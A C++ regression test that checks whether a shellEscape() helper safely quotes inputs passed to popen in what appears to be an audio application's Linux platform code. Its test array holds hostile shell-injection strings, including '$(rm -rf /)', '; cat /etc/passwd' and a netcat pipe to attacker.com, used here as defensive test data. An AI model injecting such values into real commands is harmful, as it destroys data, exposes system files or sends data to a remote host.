// © 2025 Aestra Studios — All Rights Reserved.
// SEC-008: popen shell injection regression test
//
// Proof: The shellEscape() function in PlatformUtilsLinux.cpp uses single-quote
// wrapping which is correct, BUT if any future caller fails to escape a parameter,
// shell injection becomes immediate. This test verifies the escaping function
// correctly handles all dangerous inputs.

#include "Linux/PlatformUtilsLinux.h"

#include <iostream>
#include <string>

// Check if the escaped string is safe — no unquoted shell metacharacters
bool isSafeEscaped(const std::string& escaped) {
    // The escaping function wraps content in single quotes, breaking out
    // for internal single quotes via '\'' (close quote, escaped quote, open quote).
    // This is the standard POSIX technique and is safe.
    //
    // Verification: every character must be inside a single-quoted section,
    // OR be the '\'' break sequence.
    if (escaped.empty()) return false;
    if (escaped.size() < 2) return false;
    if (escaped.front() != '\'' || escaped.back() != '\'') return false;

    // Walk through the string character by character.
    // Inside single quotes, everything is safe (shell treats all chars literally).
    // Outside quotes, only '\' followed by '\'' is allowed (the break sequence).
    size_t i = 0;
    while (i < escaped.size()) {
        if (escaped[i] == '\'') {
            // We're inside a quoted section. Find the closing quote.
            i++; // skip opening quote
            while (i < escaped.size() && escaped[i] != '\'') {
                i++; // all chars inside quotes are safe
            }
            if (i >= escaped.size()) return false; // no closing quote found
            i++; // skip closing quote
            // Now we're outside quotes. Check what follows.
            if (i >= escaped.size()) return true; // end of string — safe
            // Check for '\'' break sequence (close-quote was already consumed above)
            if (i + 1 < escaped.size() && escaped[i] == '\\' && escaped[i + 1] == '\'') {
                i += 2; // skip '\' and '\'' — position i is now the opening quote of next section
            } else if (i < escaped.size()) {
                // Something other than '\'' follows — unsafe
                return false;
            }
        } else {
            // First char is not a quote — unsafe
            return false;
        }
    }
    return true;
}

int main() {
    std::cout << "=== SEC-008: Shell injection escaping regression test ===" << std::endl;

    const std::string attackInputs[] = {
        "normal filename.wav",
        "file with spaces.wav",
        "file'with'quotes.wav",
        "$(rm -rf /)",
        "`id`",
        "; cat /etc/passwd",
        "| nc attacker.com 4444",
        "&>/dev/null",
        "a; echo pwned #",
        "'\\''$(malicious)'\\''",  // attempt to break out of the escaping
    };

    bool allSafe = true;
    for (const auto& input : attackInputs) {
        std::string escaped = Aestra::shellEscape(input);
        bool safe = isSafeEscaped(escaped);
        std::cout << "  Input: \"" << input << "\"" << std::endl;
        std::cout << "    Escaped: " << escaped << std::endl;
        std::cout << "    Safe: " << (safe ? "YES" : "NO") << std::endl;
        if (!safe) {
            std::cout << "    [FAIL] Unsafe escaping detected!" << std::endl;
            allSafe = false;
        }
    }

    if (allSafe) {
        std::cout << "\n[PASS] All inputs correctly escaped — no shell injection possible." << std::endl;
        return 0;
    }

    std::cout << "\n[FAIL] Shell escaping function is vulnerable to injection." << std::endl;
    return 1;
}
